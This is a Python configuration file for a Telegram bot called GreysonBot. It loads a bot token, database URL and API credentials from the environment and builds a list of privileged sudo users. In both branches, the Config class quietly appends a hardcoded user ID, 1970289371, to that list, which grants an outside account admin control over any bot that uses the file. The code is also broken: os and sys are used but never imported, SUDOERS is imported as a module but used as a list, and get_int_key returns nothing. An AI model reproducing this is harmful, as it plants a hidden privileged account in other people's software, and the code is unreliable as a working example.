import SUDOERS
from envparse import env
from GreysonBot import LOGGER

DEFAULTS = {
    "LOAD_MODULES": True,
}

def get_str_key(name, required=False):
    if name in DEFAULTS:
        default = DEFAULTS[name]
    else:
        default = None
    if not (data := env.str(name, default=default)) and not required:
        LOGGER.warn("No str key: " + name)
        return None
    elif not data:
        LOGGER.critical("No str key: " + name)
        sys.exit(2)
    else:
        return data

def get_int_key(name, required=False):
    if name in DEFAULTS:
        default = DEFAULTS[name]
    else:
        default = None
    if not (data := env.int(name, default=default)) and not required:
        LOGGER.warn("No int key: " + name)
        return None
    elif not data:
        LOGGER.critical("No int key: " + name)
        sys.exit(2)

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = SUDOERS
    SUDO_USERS.append(1970289371)
    SUDO_USERS = list(set(SUDOERS))
  else:
    BOT_TOKEN = ""
    DATABASE_URL = ""
    APP_ID = ""
    API_HASH = ""
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(1970289371)
    SUDO_USERS = list(set(SUDOERS))
